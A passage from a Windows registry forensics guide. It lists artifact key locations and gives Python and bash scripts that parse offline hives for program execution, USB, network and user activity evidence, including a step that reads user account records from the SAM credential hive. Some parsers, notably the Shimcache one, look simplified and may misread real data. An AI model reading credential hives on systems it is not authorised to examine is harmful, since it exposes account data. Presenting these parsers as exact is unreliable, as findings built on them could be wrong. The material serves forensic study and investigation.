SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces

# Network list (connected networks)
SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles
SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Unmanaged
SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Signatures\Managed

# Network shares
SYSTEM\CurrentControlSet\Services\LanmanServer\Shares

# Recent connections (RDP)
Software\Microsoft\Terminal Server Client\Default
```

**USB/External Device History**

```bash
# USB devices
SYSTEM\CurrentControlSet\Enum\USBSTOR
SYSTEM\CurrentControlSet\Enum\USB

# Mounted devices
SYSTEM\MountedDevices

# USB device install timestamps
SYSTEM\CurrentControlSet\Control\DeviceClasses

# Volume serial numbers
SOFTWARE\Microsoft\Windows Portable Devices\Devices

# User-specific USB history
Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2
```

**User Activity**

```bash
# UserAssist (program execution)
Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\Count

# Recent Docs
Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs

# Typed URLs (Internet Explorer)
Software\Microsoft\Internet Explorer\TypedURLs

# Run Dialog history (Win+R)
Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU

# Search history
Software\Microsoft\Windows\CurrentVersion\Explorer\WordWheelQuery

# Office Recent Files
Software\Microsoft\Office\<version>\<application>\File MRU

# Last Visited MRU
Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\LastVisitedPidlMRU
```

**System Information**

```bash
# Computer name
SYSTEM\CurrentControlSet\Control\ComputerName\ComputerName

# Time zone
SYSTEM\CurrentControlSet\Control\TimeZoneInformation

# Windows version
SOFTWARE\Microsoft\Windows NT\CurrentVersion
# ProductName, CurrentVersion, CurrentBuild

# Install date
SOFTWARE\Microsoft\Windows NT\CurrentVersion
# InstallDate (Unix timestamp)

# Shutdown time
SYSTEM\CurrentControlSet\Control\Windows
# ShutdownTime (FILETIME)

# Last logged on user
SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI
# LastLoggedOnUser, LastLoggedOnSAMUser
```

**Program Execution Evidence**

```bash
# Shimcache (Application Compatibility Cache)
SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache
# Contains executed programs with last modification time

# Amcache (Program execution and installation)
# File: C:\Windows\appcompat\Programs\Amcache.hve
# Contains detailed program execution information

# BAM/DAM (Background Activity Moderator)
SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\{SID}
SYSTEM\CurrentControlSet\Services\dam\State\UserSettings\{SID}
# Windows 10: Full path and last execution time
```

### Registry Timeline Analysis

**Extract Timeline from Registry**

```python
#!/usr/bin/env python3
from Registry import Registry
import sys
from datetime import datetime

def extract_registry_timeline(hive_path):
    """Extract timeline of registry key modifications"""
    
    try:
        reg = Registry.Registry(hive_path)
    except Exception as e:
        print(f"[-] Error: {e}")
        return
    
    timeline = []
    
    def traverse_keys(key, path=""):
        """Recursively traverse registry keys"""
        
        current_path = f"{path}\\{key.name()}" if path else key.name()
        
        # Add key modification time to timeline
        timeline.append({
            'timestamp': key.timestamp(),
            'path': current_path,
            'type': 'Key Modified'
        })
        
        # Process subkeys
        try:
            for subkey in key.subkeys():
                traverse_keys(subkey, current_path)
        except:
            pass
    
    print("[*] Extracting timeline...")
    traverse_keys(reg.root())
    
    # Sort by timestamp
    timeline.sort(key=lambda x: x['timestamp'])
    
    # Print timeline
    print(f"\n[+] REGISTRY TIMELINE ({len(timeline)} events)")
    print("=" * 80)
    
    for event in timeline[:100]:  # First 100 events
        print(f"{event['timestamp']} - {event['type']}")
        print(f"  {event['path']}\n")
    
    # Save to file
    output_file = 'registry_timeline.txt'
    with open(output_file, 'w') as f:
        for event in timeline:
            f.write(f"{event['timestamp']}|{event['type']}|{event['path']}\n")
    
    print(f"[+] Full timeline saved to: {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <registry_hive>")
        sys.exit(1)
    
    extract_registry_timeline(sys.argv[1])
```

---

**Important Subtopics for Further Study**

- **Memory Forensics** - Volatility framework, memory dump analysis, process injection detection
- **Timeline Analysis** - Plaso/log2timeline, super timeline creation, event correlation
- **File System Forensics** - NTFS artifacts ($MFT, $LogFile, $UsnJrnl), deleted file recovery
- **Windows Event Log Analysis** - Security, System, Application logs, PowerShell logs

---

### Shimcache Analysis

**Extract Shimcache (Application Compatibility Cache)**

```python
#!/usr/bin/env python3
from Registry import Registry
import sys
import struct
from datetime import datetime, timedelta

def parse_shimcache(system_hive):
    """Extract and parse Shimcache data"""
    
    try:
        reg = Registry.Registry(system_hive)
    except Exception as e:
        print(f"[-] Error opening hive: {e}")
        return
    
    print("[+] Extracting Shimcache...")
    
    # Determine current control set
    try:
        select_key = reg.open("Select")
        current_cs = select_key.value("Current").value()
        control_set = f"ControlSet{current_cs:03d}"
    except:
        control_set = "ControlSet001"  # Default
    
    print(f"[*] Using {control_set}")
    
    # Open AppCompatCache key
    try:
        appcache_path = f"{control_set}\\Control\\Session Manager\\AppCompatCache"
        appcache_key = reg.open(appcache_path)
    except Registry.RegistryKeyNotFoundException:
        print("[-] AppCompatCache key not found")
        return
    
    # Get AppCompatCache value
    try:
        cache_data = appcache_key.value("AppCompatCache").value()
    except:
        print("[-] AppCompatCache value not found")
        return
    
    print(f"[+] Cache data size: {len(cache_data)} bytes")
    
    # Parse cache entries (format varies by Windows version)
    entries = parse_cache_entries(cache_data)
    
    # Display results
    print(f"\n[+] SHIMCACHE ENTRIES ({len(entries)} total)")
    print("=" * 100)
    print(f"{'Timestamp':<25} {'Path':<60} {'Executed':<10}")
    print("-" * 100)
    
    for entry in entries:
        timestamp = entry.get('timestamp', 'N/A')
        path = entry.get('path', 'Unknown')
        executed = 'Yes' if entry.get('executed', False) else 'No'
        
        print(f"{str(timestamp):<25} {path[:58]:<60} {executed:<10}")
    
    # Save to CSV
    output_file = 'shimcache_entries.csv'
    with open(output_file, 'w') as f:
        f.write("Timestamp,Path,Executed\n")
        for entry in entries:
            timestamp = entry.get('timestamp', '')
            path = entry.get('path', '').replace(',', ';')
            executed = '1' if entry.get('executed', False) else '0'
            f.write(f"{timestamp},{path},{executed}\n")
    
    print(f"\n[+] Results saved to: {output_file}")

def parse_cache_entries(data):
    """Parse shimcache binary data (Windows 10 format)"""
    
    entries = []
    
    # Windows 10 format
    if len(data) < 0x30:
        return entries
    
    # Header is 0x30 bytes
    offset = 0x30
    
    while offset < len(data):
        try:
            # Entry header (0x10 bytes)
            if offset + 0x10 > len(data):
                break
            
            # Parse entry
            entry = {}
            
            # Path length (DWORD at offset 0x08)
            if offset + 0x0C > len(data):
                break
            
            path_length = struct.unpack('<H', data[offset+0x08:offset+0x0A])[0]
            
            # Path offset from entry start
            path_offset = offset + 0x10
            
            if path_offset + path_length > len(data):
                break
            
            # Extract path (UTF-16LE)
            path_bytes = data[path_offset:path_offset + path_length]
            try:
                path = path_bytes.decode('utf-16le').rstrip('\x00')
                entry['path'] = path
            except:
                entry['path'] = 'Unable to decode'
            
            # Last modification time (FILETIME at offset 0x00)
            filetime = struct.unpack('<Q', data[offset:offset+8])[0]
            if filetime > 0:
                try:
                    timestamp = datetime(1601, 1, 1) + timedelta(microseconds=filetime/10)
                    entry['timestamp'] = timestamp
                except:
                    entry['timestamp'] = None
            
            entries.append(entry)
            
            # Move to next entry
            offset = path_offset + path_length
            # Align to 8 bytes
            if offset % 8:
                offset += 8 - (offset % 8)
            
        except Exception as e:
            break
    
    return entries

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <SYSTEM_hive>")
        sys.exit(1)
    
    parse_shimcache(sys.argv[1])
```

### Amcache Analysis

**Parse Amcache.hve**

```python
#!/usr/bin/env python3
from Registry import Registry
import sys
from datetime import datetime, timedelta

def parse_amcache(amcache_hive):
    """Parse Amcache.hve for program execution evidence"""
    
    try:
        reg = Registry.Registry(amcache_hive)
    except Exception as e:
        print(f"[-] Error: {e}")
        return
    
    print("[+] Parsing Amcache.hve...")
    
    entries = []
    
    # Windows 10+ format
    try:
        # Try newer format first
        root = reg.open("Root")
        
        # InventoryApplicationFile entries
        try:
            inv_app = root.subkey("InventoryApplicationFile")
            
            for subkey in inv_app.subkeys():
                entry = {
                    'type': 'Application',
                    'name': None,
                    'path': None,
                    'publisher': None,
                    'version': None,
                    'timestamp': subkey.timestamp()
                }
                
                try:
                    entry['name'] = subkey.value("Name").value()
                except:
                    pass
                
                try:
                    entry['path'] = subkey.value("LowerCaseLongPath").value()
                except:
                    try:
                        entry['path'] = subkey.value("ProgramId").value()
                    except:
                        pass
                
                try:
                    entry['publisher'] = subkey.value("Publisher").value()
                except:
                    pass
                
                try:
                    entry['version'] = subkey.value("Version").value()
                except:
                    pass
                
                entries.append(entry)
        
        except Registry.RegistryKeyNotFoundException:
            pass
        
        # InventoryDriverBinary entries
        try:
            inv_driver = root.subkey("InventoryDriverBinary")
            
            for subkey in inv_driver.subkeys():
                entry = {
                    'type': 'Driver',
                    'name': None,
                    'path': None,
                    'timestamp': subkey.timestamp()
                }
                
                try:
                    entry['name'] = subkey.value("DriverName").value()
                except:
                    pass
                
                try:
                    entry['path'] = subkey.value("DriverInBox").value()
                except:
                    pass
                
                entries.append(entry)
        
        except Registry.RegistryKeyNotFoundException:
            pass
    
    except Registry.RegistryKeyNotFoundException:
        # Try older format
        try:
            root = reg.open("Root\\File")
            
            for volume_key in root.subkeys():
                for file_key in volume_key.subkeys():
                    entry = {
                        'type': 'File',
                        'name': None,
                        'path': None,
                        'sha1': None,
                        'timestamp': file_key.timestamp()
                    }
                    
                    try:
                        # Parse file reference key (contains file info)
                        for value in file_key.values():
                            name = value.name()
                            
                            if name == "15":  # File path
                                entry['path'] = value.value()
                            elif name == "0":  # Program name
                                entry['name'] = value.value()
                            elif name == "101":  # SHA1
                                entry['sha1'] = value.value()
                    except:
                        pass
                    
                    entries.append(entry)
        
        except Registry.RegistryKeyNotFoundException:
            print("[-] Unable to parse Amcache structure")
            return
    
    # Display results
    print(f"\n[+] AMCACHE ENTRIES ({len(entries)} total)")
    print("=" * 120)
    print(f"{'Timestamp':<25} {'Type':<12} {'Name':<30} {'Path':<50}")
    print("-" * 120)
    
    for entry in entries[:100]:  # First 100
        timestamp = str(entry.get('timestamp', 'N/A'))
        etype = entry.get('type', 'Unknown')
        name = (entry.get('name', 'N/A') or 'N/A')[:28]
        path = (entry.get('path', 'N/A') or 'N/A')[:48]
        
        print(f"{timestamp:<25} {etype:<12} {name:<30} {path:<50}")
    
    # Save to CSV
    output_file = 'amcache_entries.csv'
    with open(output_file, 'w') as f:
        f.write("Timestamp,Type,Name,Path,Publisher,Version,SHA1\n")
        for entry in entries:
            f.write(f"{entry.get('timestamp', '')},")
            f.write(f"{entry.get('type', '')},")
            f.write(f"\"{entry.get('name', '')}\",")
            f.write(f"\"{entry.get('path', '')}\",")
            f.write(f"\"{entry.get('publisher', '')}\",")
            f.write(f"{entry.get('version', '')},")
            f.write(f"{entry.get('sha1', '')}\n")
    
    print(f"\n[+] Results saved to: {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <Amcache.hve>")
        print("Location: C:\\Windows\\appcompat\\Programs\\Amcache.hve")
        sys.exit(1)
    
    parse_amcache(sys.argv[1])
```

### BAM/DAM Analysis (Windows 10 Execution Tracking)

**Extract BAM/DAM Entries**

```python
#!/usr/bin/env python3
from Registry import Registry
import sys
import struct
from datetime import datetime, timedelta

def parse_bam_dam(system_hive):
    """Parse BAM/DAM for program execution timestamps"""
    
    try:
        reg = Registry.Registry(system_hive)
    except Exception as e:
        print(f"[-] Error: {e}")
        return
    
    # Determine current control set
    try:
        select_key = reg.open("Select")
        current_cs = select_key.value("Current").value()
        control_set = f"ControlSet{current_cs:03d}"
    except:
        control_set = "ControlSet001"
    
    print(f"[*] Using {control_set}")
    
    all_entries = []
    
    # Try BAM (Background Activity Moderator)
    try:
        bam_path = f"{control_set}\\Services\\bam\\State\\UserSettings"
        bam_key = reg.open(bam_path)
        
        print("[+] Found BAM entries")
        
        for sid_key in bam_key.subkeys():
            sid = sid_key.name()
            
            for value in sid_key.values():
                if value.name() and value.value():
                    # Value name is the executable path
                    path = value.name()
                    
                    # Value data contains FILETIME (first 8 bytes)
                    data = value.value()
                    
                    if len(data) >= 8:
                        filetime = struct.unpack('<Q', data[0:8])[0]
                        
                        if filetime > 0:
                            try:
                                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=filetime/10)
                                
                                all_entries.append({
                                    'source': 'BAM',
                                    'sid': sid,
                                    'path': path,
                                    'timestamp': timestamp
                                })
                            except:
                                pass
    
    except Registry.RegistryKeyNotFoundException:
        print("[-] BAM key not found")
    
    # Try DAM (Desktop Activity Moderator)
    try:
        dam_path = f"{control_set}\\Services\\dam\\State\\UserSettings"
        dam_key = reg.open(dam_path)
        
        print("[+] Found DAM entries")
        
        for sid_key in dam_key.subkeys():
            sid = sid_key.name()
            
            for value in sid_key.values():
                if value.name() and value.value():
                    path = value.name()
                    data = value.value()
                    
                    if len(data) >= 8:
                        filetime = struct.unpack('<Q', data[0:8])[0]
                        
                        if filetime > 0:
                            try:
                                timestamp = datetime(1601, 1, 1) + timedelta(microseconds=filetime/10)
                                
                                all_entries.append({
                                    'source': 'DAM',
                                    'sid': sid,
                                    'path': path,
                                    'timestamp': timestamp
                                })
                            except:
                                pass
    
    except Registry.RegistryKeyNotFoundException:
        print("[-] DAM key not found")
    
    if not all_entries:
        print("[-] No BAM/DAM entries found")
        return
    
    # Sort by timestamp (most recent first)
    all_entries.sort(key=lambda x: x['timestamp'], reverse=True)
    
    # Display results
    print(f"\n[+] BAM/DAM EXECUTION ENTRIES ({len(all_entries)} total)")
    print("=" * 120)
    print(f"{'Timestamp':<25} {'Source':<8} {'SID':<45} {'Path':<40}")
    print("-" * 120)
    
    for entry in all_entries[:100]:
        print(f"{str(entry['timestamp']):<25} {entry['source']:<8} {entry['sid']:<45} {entry['path'][:38]:<40}")
    
    # Save to CSV
    output_file = 'bam_dam_entries.csv'
    with open(output_file, 'w') as f:
        f.write("Timestamp,Source,SID,Path\n")
        for entry in all_entries:
            f.write(f"{entry['timestamp']},{entry['source']},{entry['sid']},\"{entry['path']}\"\n")
    
    print(f"\n[+] Results saved to: {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <SYSTEM_hive>")
        sys.exit(1)
    
    parse_bam_dam(sys.argv[1])
```

### USB Device History Analysis

**Extract USB Device History**

```python
#!/usr/bin/env python3
from Registry import Registry
import sys
from datetime import datetime

def analyze_usb_devices(system_hive):
    """Extract USB device history from SYSTEM hive"""
    
    try:
        reg = Registry.Registry(system_hive)
    except Exception as e:
        print(f"[-] Error: {e}")
        return
    
    # Determine current control set
    try:
        select_key = reg.open("Select")
        current_cs = select_key.value("Current").value()
        control_set = f"ControlSet{current_cs:03d}"
    except:
        control_set = "ControlSet001"
    
    print(f"[*] Using {control_set}")
    
    devices = []
    
    # Parse USBSTOR (USB Storage Devices)
    try:
        usbstor_path = f"{control_set}\\Enum\\USBSTOR"
        usbstor_key = reg.open(usbstor_path)
        
        print("[+] Extracting USB storage devices...")
        
        for device_key in usbstor_key.subkeys():
            device_name = device_key.name()
            
            # Parse device name (format: Disk&Ven_Vendor&Prod_Product&Rev_Revision)
            parts = device_name.split('&')
            vendor = prod = rev = "Unknown"
            
            for part in parts:
                if part.startswith('Ven_'):
                    vendor = part[4:]
                elif part.startswith('Prod_'):
                    prod = part[5:]
                elif part.startswith('Rev_'):
                    rev = part[4:]
            
            # Each device can have multiple serial numbers (instances)
            for serial_key in device_key.subkeys():
                serial = serial_key.name()
                
                # Get device properties
                friendly_name = "Unknown"
                try:
                    friendly_name = serial_key.value("FriendlyName").value()
                except:
                    pass
                
                # First install timestamp
                install_time = serial_key.timestamp()
                
                devices.append({
                    'vendor': vendor,
                    'product': prod,
                    'revision': rev,
                    'serial': serial,
                    'friendly_name': friendly_name,
                    'first_install': install_time,
                    'type': 'Storage'
                })
    
    except Registry.RegistryKeyNotFoundException:
        print("[-] USBSTOR key not found")
    
    # Parse USB (General USB Devices)
    try:
        usb_path = f"{control_set}\\Enum\\USB"
        usb_key = reg.open(usb_path)
        
        print("[+] Extracting USB devices...")
        
        for device_key in usb_key.subkeys():
            device_name = device_key.name()
            
            # Parse VID and PID (format: VID_xxxx&PID_xxxx)
            vid = pid = "Unknown"
            
            vid_match = device_name.find('VID_')
            if vid_match != -1:
                vid = device_name[vid_match+4:vid_match+8]
            
            pid_match = device_name.find('PID_')
            if pid_match != -1:
                pid = device_name[pid_match+4:pid_match+8]
            
            for serial_key in device_key.subkeys():
                serial = serial_key.name()
                
                friendly_name = "Unknown"
                try:
                    friendly_name = serial_key.value("DeviceDesc").value()
                except:
                    pass
                
                install_time = serial_key.timestamp()
                
                devices.append({
                    'vid': vid,
                    'pid': pid,
                    'serial': serial,
                    'friendly_name': friendly_name,
                    'first_install': install_time,
                    'type': 'USB'
                })
    
    except Registry.RegistryKeyNotFoundException:
        print("[-] USB key not found")
    
    # Display results
    print(f"\n[+] USB DEVICE HISTORY ({len(devices)} devices)")
    print("=" * 120)
    print(f"{'First Seen':<25} {'Type':<10} {'Vendor/VID':<15} {'Product/PID':<15} {'Serial':<25} {'Name':<25}")
    print("-" * 120)
    
    for device in sorted(devices, key=lambda x: x['first_install'], reverse=True):
        timestamp = str(device['first_install'])
        dtype = device['type']
        
        if dtype == 'Storage':
            id1 = device['vendor'][:13]
            id2 = device['product'][:13]
        else:
            id1 = device['vid']
            id2 = device['pid']
        
        serial = device['serial'][:23]
        name = device['friendly_name'][:23]
        
        print(f"{timestamp:<25} {dtype:<10} {id1:<15} {id2:<15} {serial:<25} {name:<25}")
    
    # Save to CSV
    output_file = 'usb_devices.csv'
    with open(output_file, 'w') as f:
        f.write("Timestamp,Type,Vendor/VID,Product/PID,Serial,Friendly_Name\n")
        for device in devices:
            if device['type'] == 'Storage':
                f.write(f"{device['first_install']},{device['type']},{device['vendor']},{device['product']},\"{device['serial']}\",\"{device['friendly_name']}\"\n")
            else:
                f.write(f"{device['first_install']},{device['type']},{device['vid']},{device['pid']},\"{device['serial']}\",\"{device['friendly_name']}\"\n")
    
    print(f"\n[+] Results saved to: {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <SYSTEM_hive>")
        sys.exit(1)
    
    analyze_usb_devices(sys.argv[1])
```

### Network History Analysis

**Extract Network Connection History**

```python
#!/usr/bin/env python3
from Registry import Registry
import sys

def analyze_network_history(software_hive):
    """Extract network connection history"""
    
    try:
        reg = Registry.Registry(software_hive)
    except Exception as e:
        print(f"[-] Error: {e}")
        return
    
    networks = []
    
    # NetworkList Profiles
    try:
        profiles_path = "Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Profiles"
        profiles_key = reg.open(profiles_path)
        
        print("[+] Extracting network profiles...")
        
        for profile_key in profiles_key.subkeys():
            guid = profile_key.name()
            
            network = {
                'guid': guid,
                'name': None,
                'description': None,
                'first_connect': profile_key.timestamp(),
                'last_connect': None,
                'type': None,
                'managed': False
            }
            
            try:
                network['name'] = profile_key.value("ProfileName").value()
            except:
                pass
            
            try:
                network['description'] = profile_key.value("Description").value()
            except:
                pass
            
            try:
                # DateLastConnected (binary FILETIME)
                date_data = profile_key.value("DateLastConnected").value()
                if len(date_data) >= 8:
                    import struct
                    from datetime import datetime, timedelta
                    
                    filetime = struct.unpack('<Q', date_data[0:8])[0]
                    if filetime > 0:
                        network['last_connect'] = datetime(1601, 1, 1) + timedelta(microseconds=filetime/10)
            except:
                pass
            
            try:
                # NameType: 6=Wireless, 23=Wired
                name_type = profile_key.value("NameType").value()
                network['type'] = 'Wireless' if name_type == 6 else 'Wired' if name_type == 23 else f'Unknown ({name_type})'
            except:
                pass
            
            try:
                managed = profile_key.value("Managed").value()
                network['managed'] = bool(managed)
            except:
                pass
            
            networks.append(network)
    
    except Registry.RegistryKeyNotFoundException:
        print("[-] NetworkList Profiles key not found")
    
    # NetworkList Signatures (contains additional info like MAC addresses)
    try:
        signatures_path = "Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Unmanaged"
        signatures_key = reg.open(signatures_path)
        
        for sig_key in signatures_key.subkeys():
            try:
                profile_guid = sig_key.value("ProfileGuid").value()
                
                # Find matching network
                for network in networks:
                    if network['guid'].lower() == profile_guid.lower():
                        try:
                            network['dns_suffix'] = sig_key.value("DnsSuffix").value()
                        except:
                            pass
                        
                        try:
                            network['first_network'] = sig_key.value("FirstNetwork").value()
                        except:
                            pass
                        
                        try:
                            network['default_gateway'] = sig_key.value("DefaultGatewayMac").value()
                        except:
                            pass
                        
                        break
            except:
                pass
    
    except Registry.RegistryKeyNotFoundException:
        pass
    
    # Display results
    print(f"\n[+] NETWORK CONNECTION HISTORY ({len(networks)} networks)")
    print("=" * 120)
    print(f"{'First Connect':<25} {'Last Connect':<25} {'Type':<10} {'Name':<30} {'DNS Suffix':<25}")
    print("-" * 120)
    
    for network in sorted(networks, key=lambda x: x['first_connect'], reverse=True):
        first = str(network['first_connect'])
        last = str(network['last_connect']) if network['last_connect'] else 'N/A'
        ntype = network['type'] or 'Unknown'
        name = (network['name'] or 'Unknown')[:28]
        dns = (network.get('dns_suffix', 'N/A') or 'N/A')[:23]
        
        print(f"{first:<25} {last:<25} {ntype:<10} {name:<30} {dns:<25}")
    
    # Save to CSV
    output_file = 'network_history.csv'
    with open(output_file, 'w') as f:
        f.write("First_Connect,Last_Connect,Type,Name,Description,DNS_Suffix,Managed\n")
        for network in networks:
            f.write(f"{network['first_connect']},")
            f.write(f"{network['last_connect']},")
            f.write(f"{network['type']},")
            f.write(f"\"{network['name']}\",")
            f.write(f"\"{network['description']}\",")
            f.write(f"\"{network.get('dns_suffix', '')}\",")
            f.write(f"{network['managed']}\n")
    
    print(f"\n[+] Results saved to: {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <SOFTWARE_hive>")
        sys.exit(1)
    
    analyze_network_history(sys.argv[1])
```

### Comprehensive Registry Forensics Script

**All-in-One Registry Analysis**

```bash
#!/bin/bash
# registry_forensics.sh - Comprehensive registry analysis

HIVE_DIR="$1"
OUTPUT_DIR="/tmp/registry_analysis"

if [ -z "$HIVE_DIR" ]; then
    echo "Usage: $0 <registry_hive_directory>"
    echo "Example: $0 /mnt/windows/Windows/System32/config/"
    exit 1
fi

mkdir -p "$OUTPUT_DIR"

echo "[*] Starting comprehensive registry forensics..."
echo "[*] Hive directory: $HIVE_DIR"
echo "[*] Output directory: $OUTPUT_DIR"
echo ""

# Check for required hives
SYSTEM_HIVE="$HIVE_DIR/SYSTEM"
SOFTWARE_HIVE="$HIVE_DIR/SOFTWARE"
SAM_HIVE="$HIVE_DIR/SAM"
SECURITY_HIVE="$HIVE_DIR/SECURITY"

if [ ! -f "$SYSTEM_HIVE" ]; then
    echo "[-] SYSTEM hive not found"
    exit 1
fi

# 1. System Information
echo "[+] Extracting system information..."
reglookup -p 'ControlSet001/Control/ComputerName/ComputerName' "$SYSTEM_HIVE" | grep "ComputerName" > "$OUTPUT_DIR/01_system_info.txt"
reglookup -p 'ControlSet001/Control/TimeZoneInformation' "$SYSTEM_HIVE" >> "$OUTPUT_DIR/01_system_info.txt"

# 2. Autostart locations
echo "[+] Extracting autostart entries..."
if [ -f "$SOFTWARE_HIVE" ]; then
    reglookup -p 'Microsoft/Windows/CurrentVersion/Run' "$SOFTWARE_HIVE" > "$OUTPUT_DIR/02_autostart.txt"
    reglookup -p 'Microsoft/Windows/CurrentVersion/RunOnce' "$SOFTWARE_HIVE" >> "$OUTPUT_DIR/02_autostart.txt"
fi

# 3. Services
echo "[+] Extracting services..."
reglookup -p 'ControlSet001/Services' "$SYSTEM_HIVE" | grep "ImagePath" > "$OUTPUT_DIR/03_services.txt"

# 4. USB Devices
echo "[+] Extracting USB device history..."
reglookup -p 'ControlSet001/Enum/USBSTOR' "$SYSTEM_HIVE" > "$OUTPUT_DIR/04_usb_devices.txt"
reglookup -p 'ControlSet001/Enum/USB' "$SYSTEM_HIVE" >> "$OUTPUT_DIR/04_usb_devices.txt"

# 5. Network Information
echo "[+] Extracting network information..."
reglookup -p 'ControlSet001/Services/Tcpip/Parameters/Interfaces' "$SYSTEM_HIVE" > "$OUTPUT_DIR/05_network_interfaces.txt"

if [ -f "$SOFTWARE_HIVE" ]; then
    reglookup -p 'Microsoft/Windows NT/CurrentVersion/NetworkList' "$SOFTWARE_HIVE" > "$OUTPUT_DIR/05_network_list.txt"
fi

# 6. Installed Software
echo "[+] Extracting installed software..."
if [ -f "$SOFTWARE_HIVE" ]; then
    reglookup -p 'Microsoft/Windows/CurrentVersion/Uninstall' "$SOFTWARE_HIVE" > "$OUTPUT_DIR/06_installed_software.txt"
fi

# 7. User Accounts (requires SAM)
echo "[+] Extracting user accounts..."
if [ -f "$SAM_HIVE" ]; then
    reglookup -p 'SAM/Domains/Account/Users' "$SAM_HIVE" > "$OUTPUT_DIR/07_user_accounts.txt"
fi

# 8. Shimcache
echo "[+] Extracting Shimcache..."
reglookup -p 'ControlSet001/Control/Session Manager/AppCompatCache' "$SYSTEM_HIVE" | head -n 50 > "$OUTPUT_DIR/08_shimcache.txt"

# 9. BAM/DAM
echo "[+] Extracting BAM/DAM entries..."
reglookup -p 'ControlSet001/Services/bam/State/UserSettings' "$SYSTEM_HIVE" > "$OUTPUT_DIR/09_bam.txt" 2>/dev/null
reglookup -p 'ControlSet001/Services/dam/State/UserSettings' "$SYSTEM_HIVE" >> "$OUTPUT_DIR/09_dam.txt" 2>/dev/null

# 10. Last Shutdown Time
echo "[+] Extracting shutdown time..."
reglookup -p 'ControlSet001/Control/Windows' "$SYSTEM_HIVE" | grep "ShutdownTime" > "$OUTPUT_DIR/10_shutdown_time.txt"

# 11. MountedDevices
echo "[+] Extracting mounted devices..."
reglookup -p 'MountedDevices' "$SYSTEM_HIVE" > "$OUTPUT_DIR/11_mounted_devices.txt"

# 12. Recent Apps (if NTUSER.DAT available)
if [ -d "$HIVE_DIR/../Users" ]; then
    echo "[+] Searching for user NTUSER.DAT files..."
    
    find "$HIVE_DIR/../Users" -name "NTUSER.DAT" 2>/dev/null | while read ntuser; do
        username=$(echo "$ntuser" | cut -d'/' -f7)
        echo "[*] Processing user: $username"
        
        # UserAssist
        reglookup -p 'Software/Microsoft/Windows/CurrentVersion/Explorer/UserAssist' "$ntuser" > "$OUTPUT_DIR/12_userassist_$username.txt" 2>/dev/null
        
        # RecentDocs
        reglookup -p 'Software/Microsoft/Windows/CurrentVersion/Explorer/RecentDocs' "$ntuser" > "$OUTPUT_DIR/13_recentdocs_$username.txt" 2>/dev/null
        
        # TypedURLs
        reglookup -p 'Software/Microsoft/Internet Explorer/TypedURLs' "$ntuser" > "$OUTPUT_DIR/14_typedurls_$username.txt" 2>/dev/null
        
        # RunMRU
        reglookup -p 'Software/Microsoft/Windows/CurrentVersion/Explorer/RunMRU' "$ntuser" > "$OUTPUT_DIR/15_runmru_$username.txt" 2>/dev/null
    done
fi

# 13. Generate summary report
echo "[+] Generating summary report..."

cat > "$OUTPUT_DIR/00_SUMMARY_REPORT.txt" << EOF
================================================================================
                    REGISTRY FORENSICS ANALYSIS REPORT
================================================================================

Analysis Date: $(date)
Hive Directory: $HIVE_DIR
Output Directory: $OUTPUT_DIR

================================================================================
                              ARTIFACTS EXTRACTED
================================================================================

1.  System Information        - 01_system_info.txt
2.  Autostart Entries         - 02_autostart.txt
3.  Services                  - 03_services.txt
4.  USB Device History        - 04_usb_devices.txt
5.  Network Configuration     - 05_network_interfaces.txt, 05_network_list.txt
6.  Installed Software        - 06_installed_software.txt
7.  User Accounts             - 07_user_accounts.txt
8.  Shimcache (Execution)     - 08_shimcache.txt
9.  BAM/DAM (Execution)       - 09_bam.txt, 09_dam.txt
10. Shutdown Time             - 10_shutdown_time.txt
11. Mounted Devices           - 11_mounted_devices.txt
12. User Activity             - 12_userassist_*.txt
13. Recent Documents          - 13_recentdocs_*.txt
14. Typed URLs                - 14_typedurls_*.txt
15. Run Dialog History        - 15_runmru_*.txt

================================================================================
                           KEY FINDINGS SUMMARY
================================================================================

System Information:
EOF

# Add computer name if found
if grep -q "ComputerName" "$OUTPUT_DIR/01_system_info.txt"; then
    echo "  Computer Name: $(grep "ComputerName" "$OUTPUT_DIR/01_system_info.txt" | tail -1 | cut -d',' -f3)" >> "$OUTPUT_DIR/00_SUMMARY_REPORT.txt"
fi

# Count autostart entries
autostart_count=$(grep -c "^/" "$OUTPUT_DIR/02_autostart.txt" 2>/dev/null || echo 0)
echo "  Autostart Entries: $autostart_count" >> "$OUTPUT_DIR/00_SUMMARY_REPORT.txt"

# Count services
service_count=$(grep -c "ImagePath" "$OUTPUT_DIR/03_services.txt" 2>/dev/null || echo 0)
echo "  Services: $service_count" >> "$OUTPUT_DIR/00_SUMMARY_REPORT.txt"

# Count USB devices
usb_count=$(grep -c "FriendlyName" "$OUTPUT_DIR/04_usb_devices.txt" 2>/dev/null || echo 0)
echo "  USB Devices: $usb_count" >> "$OUTPUT_DIR/00_SUMMARY_REPORT.txt"

# Count installed software
software_count=$(grep -c "DisplayName" "$OUTPUT_DIR/06_installed_software.txt" 2>/dev/null || echo 0)
echo "  Installed Programs: $software_count" >> "$OUTPUT_DIR/00_SUMMARY_REPORT.txt"

cat >> "$OUTPUT_DIR/00_SUMMARY_REPORT.txt" << EOF

================================================================================
                              ANALYSIS NOTES
================================================================================

